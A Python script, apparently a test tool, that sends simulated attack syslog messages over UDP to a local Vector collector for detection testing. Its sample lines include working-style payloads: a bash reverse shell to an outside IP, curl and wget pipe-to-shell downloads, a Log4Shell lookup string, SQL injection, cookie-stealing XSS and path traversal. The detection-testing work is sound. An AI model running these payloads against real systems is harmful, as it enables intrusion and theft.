#!/usr/bin/env python3
import argparse
import itertools
import random
import re
import socket
import time
from datetime import datetime, timezone
from itertools import cycle


DEFAULT_ATTACKER_IPS = "10.77.10.11,10.77.10.12,10.77.10.13,10.77.10.14,10.77.10.15"
IP_PATTERN = r"\d{1,3}(?:\.\d{1,3}){3}"
ATTACKER_IP_PATTERNS = [
    re.compile(rf"(?<=\bfrom ){IP_PATTERN}"),
    re.compile(rf"(?<=\brhost=){IP_PATTERN}"),
    re.compile(rf"(?<=\bClient ){IP_PATTERN}"),
    re.compile(rf"(?<=\bsrc=){IP_PATTERN}"),
    re.compile(rf"(?<=\bsrc_ip=){IP_PATTERN}"),
    re.compile(rf"(?<=\bSRC=){IP_PATTERN}"),
    re.compile(rf"(?<=\bsrc=){IP_PATTERN}"),
    re.compile(rf"^{IP_PATTERN}(?= - - )"),
]


SAMPLES = [
    (
        "ssh_bruteforce",
        "sshd",
        "Failed password for invalid user admin from 203.0.113.10 port 48122 ssh2",
    ),
    (
        "ssh_bruteforce",
        "sshd",
        "Failed password for root from 203.0.113.12 port 51432 ssh2",
    ),
    (
        "ssh_bruteforce",
        "sshd",
        "Invalid user oracle from 203.0.113.11 port 48123",
    ),
    (
        "ssh_bruteforce",
        "sshd",
        "authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=203.0.113.13 user=admin",
    ),
    (
        "ssh_bruteforce",
        "sshd",
        "PAM 5 more authentication failures; rhost=203.0.113.14 user=root",
    ),
    (
        "ftp_bruteforce",
        "vsftpd",
        "FAIL LOGIN: Client 203.0.113.20, user anonymous",
    ),
    (
        "rdp_bruteforce",
        "rdp-gateway",
        "RDP login failed user=administrator src=203.0.113.21 reason=bad_password",
    ),
    (
        "port_scan",
        "kernel",
        "IN=eth0 OUT= MAC= SRC=203.0.113.30 DST=192.0.2.10 PROTO=TCP SPT=54321 DPT=22 SYN scan detected",
    ),
    (
        "port_scan",
        "suricata",
        "ET SCAN Nmap Scripting Engine User-Agent Detected src_ip=203.0.113.31 dest_ip=192.0.2.10",
    ),
    (
        "port_scan",
        "suricata",
        "GPL SCAN FIN Scan Detected src_ip=203.0.113.32 dest_ip=192.0.2.10 proto=TCP",
    ),
    (
        "sql_injection",
        "nginx",
        '198.51.100.21 - - "GET /products?id=1 UNION SELECT username,password FROM users HTTP/1.1" 403 532',
    ),
    (
        "sql_injection",
        "nginx",
        '198.51.100.22 - - "GET /login?user=admin or 1=1 HTTP/1.1" 403 412',
    ),
    (
        "sql_injection",
        "nginx",
        '198.51.100.23 - - "GET /search?q=1%27%20OR%20%271%27=%271 HTTP/1.1" 403 410',
    ),
    (
        "sql_injection",
        "nginx",
        '198.51.100.24 - - "GET /item?id=5;WAITFOR DELAY \'0:0:5\' HTTP/1.1" 403 512',
    ),
    (
        "sql_injection",
        "nginx",
        '198.51.100.25 - - "GET /report?id=7 AND sleep(5) HTTP/1.1" 403 477',
    ),
    (
        "sql_injection",
        "nginx",
        '198.51.100.26 - - "GET /api/user?id=1 AND 1=CONVERT(int,@@version) HTTP/1.1" 500 633',
    ),
    (
        "xss",
        "nginx",
        '198.51.100.31 - - "GET /search?q=<script>alert(1)</script> HTTP/1.1" 403 355',
    ),
    (
        "xss",
        "nginx",
        '198.51.100.32 - - "GET /profile?next=javascript:alert(document.cookie) HTTP/1.1" 403 388',
    ),
    (
        "xss",
        "nginx",
        '198.51.100.33 - - "GET /avatar?url=x onerror=alert(1) HTTP/1.1" 403 322',
    ),
    (
        "xss",
        "nginx",
        '198.51.100.34 - - "POST /comment body=\\"<img src=x onload=alert(1)>\\" HTTP/1.1" 403 390',
    ),
    (
        "path_traversal",
        "nginx",
        '203.0.113.44 - - "GET /download?file=../../../../etc/passwd HTTP/1.1" 403 298',
    ),
    (
        "path_traversal",
        "nginx",
        '203.0.113.45 - - "GET /cgi-bin/view?path=/proc/self/environ HTTP/1.1" 403 301',
    ),
    (
        "path_traversal",
        "nginx",
        '203.0.113.46 - - "GET /static?name=..%2f..%2f..%2fwindows%2fwin.ini HTTP/1.1" 403 280',
    ),
    (
        "path_traversal",
        "nginx",
        '203.0.113.47 - - "GET /backup?file=..\\\\..\\\\..\\\\boot.ini HTTP/1.1" 403 284',
    ),
    (
        "webshell_upload",
        "nginx",
        '198.51.100.41 - - "POST /upload filename=shell.php content_type=application/x-php HTTP/1.1" 403 245',
    ),
    (
        "webshell_upload",
        "nginx",
        '198.51.100.42 - - "POST /admin/upload filename=cmd.jsp content_type=application/octet-stream HTTP/1.1" 403 260',
    ),
    (
        "ssrf",
        "nginx",
        '198.51.100.51 - - "GET /fetch?url=http://169.254.169.254/latest/meta-data/ HTTP/1.1" 403 330',
    ),
    (
        "ssrf",
        "nginx",
        '198.51.100.52 - - "GET /proxy?target=http://127.0.0.1:8080/admin HTTP/1.1" 403 302',
    ),
    (
        "log4shell_probe",
        "nginx",
        '198.51.100.61 - - "GET / HTTP/1.1" 400 188 "-" "${jndi:ldap://198.51.100.61/a}"',
    ),
    (
        "log4shell_probe",
        "app",
        "blocked suspicious lookup pattern user_agent=${jndi:dns://198.51.100.62/example}",
    ),
    (
        "command_execution",
        "app",
        'command probe payload="bash -i >& /dev/tcp/198.51.100.88/4444 0>&1"',
    ),
    (
        "command_execution",
        "app",
        'command probe payload="curl http://198.51.100.89/p.sh | sh"',
    ),
    (
        "command_execution",
        "app",
        'command probe payload="wget http://198.51.100.90/install.sh -O- | sh"',
    ),
    (
        "command_execution",
        "app",
        'command probe payload="/bin/sh -c id;uname -a"',
    ),
    (
        "command_execution",
        "app",
        "process spawned suspicious shell parent=www-data command=/bin/sh src_ip=198.51.100.91",
    ),
    (
        "privilege_abuse",
        "sudo",
        "user appuser is not in the sudoers file. This incident will be reported.",
    ),
    (
        "privilege_abuse",
        "sudo",
        "pam_unix(sudo:auth): authentication failure; user=root rhost=198.51.100.101",
    ),
    (
        "privilege_abuse",
        "auditd",
        "type=USER_ROLE_CHANGE msg=audit(1716366000.123:884): user pid=4123 uid=0 auid=1001 ses=12 msg='op=PAM:setcred acct=root exe=/usr/bin/sudo res=failed'",
    ),
    (
        "suspicious_process",
        "auditd",
        "type=EXECVE msg=audit(1716366100.234:901): argc=3 a0=python3 a1=-c a2=import socket,subprocess,os",
    ),
    (
        "malware_download",
        "proxy",
        "blocked outbound request src=192.0.2.50 dst=198.51.100.111 url=http://198.51.100.111/dropper.bin category=malware",
    ),
    (
        "dns_tunneling",
        "dnsmasq",
        "query[A] aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.exfil.example.invalid from 192.0.2.60",
    ),
    (
        "c2_beacon",
        "proxy",
        "repeated small outbound request src=192.0.2.70 dst=198.51.100.120 uri=/api/checkin interval=30s user_agent=stage-client",
    ),
]


def build_syslog(hostname: str, appname: str, message: str, seq: int) -> str:
    timestamp = datetime.now(timezone.utc).isoformat(timespec="milliseconds").replace("+00:00", "Z")
    procid = 4000 + seq
    msgid = f"attack-sim-{seq}"
    return f"<134>1 {timestamp} {hostname} {appname} {procid} {msgid} - {message}"


def parse_csv(value: str) -> list[str]:
    return [item.strip() for item in value.split(",") if item.strip()]


def render_template(value: str, attacker_ip: str, seq: int) -> str:
    return value.replace("{ip}", attacker_ip).replace("{seq}", str(seq))


def rewrite_attacker_ip(message: str, attacker_ip: str) -> str:
    rewritten = message
    for pattern in ATTACKER_IP_PATTERNS:
        rewritten = pattern.sub(attacker_ip, rewritten)
    return f"attacker_ip={attacker_ip} {rewritten}"


def open_sender_sockets(source_ips: list[str], bind_source_ips: bool) -> list[socket.socket]:
    if not bind_source_ips:
        return [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]

    sockets: list[socket.socket] = []
    try:
        for source_ip in source_ips:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.bind((source_ip, 0))
            sockets.append(sock)
    except OSError as exc:
        for sock in sockets:
            sock.close()
        raise SystemExit(
            f"cannot bind UDP source IP {source_ip!r}: {exc}. "
            "请先配置本机 IP 别名，例如: sudo ifconfig lo0 alias "
            f"{source_ip} 255.255.255.255；或者去掉 --bind-source-ips 只改日志正文里的攻击者 IP。"
        ) from exc
    return sockets


def main() -> None:
    parser = argparse.ArgumentParser(description="Send simulated attack syslog events to Vector UDP syslog.")
    parser.add_argument("--host", default="127.0.0.1")
    parser.add_argument("--port", type=int, default=10514)
    parser.add_argument("--count", type=int, default=len(SAMPLES), help="messages to send; 0 means send forever")
    parser.add_argument("--rate", type=float, default=1.0, help="messages per second")
    parser.add_argument("--hostname", default="attack-simulator.local")
    parser.add_argument(
        "--attacker-ips",
        default=DEFAULT_ATTACKER_IPS,
        help="comma-separated attacker IPs used in message body; supports local alias IPs",
    )
    parser.add_argument(
        "--source-ips",
        default="",
        help="comma-separated local source IPs to bind UDP sockets; defaults to --attacker-ips",
    )
    parser.add_argument(
        "--bind-source-ips",
        action="store_true",
        help="bind UDP sockets to --source-ips so Vector sees different source_ip values",
    )
    parser.add_argument("--types", default="", help="comma-separated attack types to send, for example: ssh_bruteforce,sql_injection")
    parser.add_argument("--list-types", action="store_true", help="print available attack types and exit")
    parser.add_argument("--loop", action="store_true", help="send forever; equivalent to --count 0")
    parser.add_argument("--shuffle", action="store_true")
    args = parser.parse_args()

    available_types = sorted({sample[0] for sample in SAMPLES})
    if args.list_types:
        print("\n".join(available_types))
        return

    samples = SAMPLES.copy()
    if args.types:
        selected_types = {item.strip() for item in args.types.split(",") if item.strip()}
        samples = [sample for sample in samples if sample[0] in selected_types]
        if not samples:
            raise SystemExit(f"no samples matched --types={args.types!r}; available: {', '.join(available_types)}")

    if args.shuffle:
        random.shuffle(samples)

    attacker_ips = parse_csv(args.attacker_ips)
    if not attacker_ips:
        raise SystemExit("--attacker-ips is empty")
    source_ips = parse_csv(args.source_ips) or attacker_ips

    interval = 1.0 / args.rate if args.rate > 0 else 0.0
    address = (args.host, args.port)
    count = 0 if args.loop else args.count
    sequence = itertools.count(1) if count <= 0 else range(1, count + 1)
    attacker_ip_iter = cycle(attacker_ips)

    try:
        sockets = open_sender_sockets(source_ips, args.bind_source_ips)
        socket_iter = cycle(sockets)
        try:
            for seq in sequence:
                attack_type, appname, message = samples[(seq - 1) % len(samples)]
                attacker_ip = next(attacker_ip_iter)
                hostname = render_template(args.hostname, attacker_ip, seq)
                payload = build_syslog(hostname, appname, rewrite_attacker_ip(message, attacker_ip), seq)
                sock = next(socket_iter)
                sock.sendto(payload.encode("utf-8"), address)
                source = sock.getsockname()[0] if args.bind_source_ips else "default"
                print(
                    f"sent seq={seq} type={attack_type} app={appname} attacker_ip={attacker_ip} "
                    f"source={source} target={args.host}:{args.port}",
                    flush=True,
                )
                if interval > 0:
                    time.sleep(interval)
        finally:
            for sock in sockets:
                sock.close()
    except KeyboardInterrupt:
        print("\nstopped by user")


if __name__ == "__main__":
    main()
